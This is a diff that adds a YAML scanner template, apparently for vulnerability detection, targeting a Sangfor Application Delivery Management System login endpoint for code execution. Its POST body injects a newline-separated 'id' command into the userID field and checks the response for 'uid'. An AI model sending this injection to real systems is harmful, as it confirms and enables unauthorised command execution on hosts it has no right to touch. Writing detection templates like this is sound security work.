@@ -1,0 +1,15 @@
+name: 深信服-应用交付管理系统
+description: >-
+  代码执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /rep/login
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      userID=admin%0Aid%0A&userPsw=123&page=login&log_type=report&index=index&clsMode=cls_mode_login&rnd=0.9709373567217479
+    expression:
+      status: 200
+      body_all: ["uid"]
